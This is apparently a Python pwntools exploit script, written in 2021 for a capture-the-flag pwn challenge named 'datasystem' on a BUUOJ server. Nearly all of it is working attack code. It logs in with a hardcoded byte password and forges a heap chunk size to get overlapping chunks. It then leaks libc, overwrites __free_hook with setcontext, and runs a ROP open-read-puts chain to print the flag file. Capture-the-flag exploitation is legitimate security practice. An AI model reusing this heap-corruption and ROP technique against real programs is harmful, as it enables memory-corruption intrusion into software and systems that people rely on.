# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './datasystem'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '27789'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(size , Content):
    cmd(1)
    sla('Size: ' , size)
    sa('Content' , Content)

def delete(idx):
    cmd(2)
    sla('Index' , idx)

def show(idx ):
    cmd(3)
    sla('Index' , idx)

def edit(idx ,Content):
    cmd(4)
    sla('Index' , idx)
    sla('Content' , Content)

# one_gad = one_gadget(libc.path)

pwd = '\x1b\xf3\xee\xf3\xb2\x13\xf6\x0e\x9er\xcb\xc5\x83\x97/\x0e\xa7\x93I\xef7\xed\xc7j\xa8Z\xb3\xdaX[\xea\x83'

sa('username' , 'admin')
sa('password:' , pwd)

# add( 0x20 , 'a'*0x20)

add(0x18 , 'a')
add(0x420 , '\x00')
add(0x150 , 'a')
add(0x18 , 'a')

delete(0)
add(0x18 , flat(0,0,0,0x160+0x431))
delete(1)
add(0x420 ,'a')
show(2)

__malloc_hook = l64() - 0x70
libc.address = __malloc_hook - libc.sym['__malloc_hook']
__free_hook = libc.sym['__free_hook']
setcontext = libc.sym['setcontext'] + 53

read_addr = libc.sym['read']
open_addr = libc.sym['open']
puts_addr = libc.sym['puts']
ret = libc.search(asm(' ret')).next()
pop_rax_ret = libc.search(asm('pop rax; ret')).next()
pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
pop_rdx_ret = libc.search(asm('pop rdx; ret')).next()
pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()


add(0x150 , 'a')
delete(4)

edit(2 ,p64(__free_hook) )

flag_addr = __free_hook + 0x148

orw = flat(
    pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
    pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
    pop_rdi_ret , flag_addr , puts_addr
)

payload = p64(setcontext) + orw + p64(0)*3 + p64(__free_hook + 8) + p64(ret)

add(0x150 , 'a')
add(0x150 , payload.ljust(0x148,'\x00') + 'flag\x00' )

# dbg()
delete(5)

# dbg()


p.interactive()

'''
@File    :   datasystem.py
@Time    :   2021/09/25 15:29:56
@Author  :   Niyah 
'''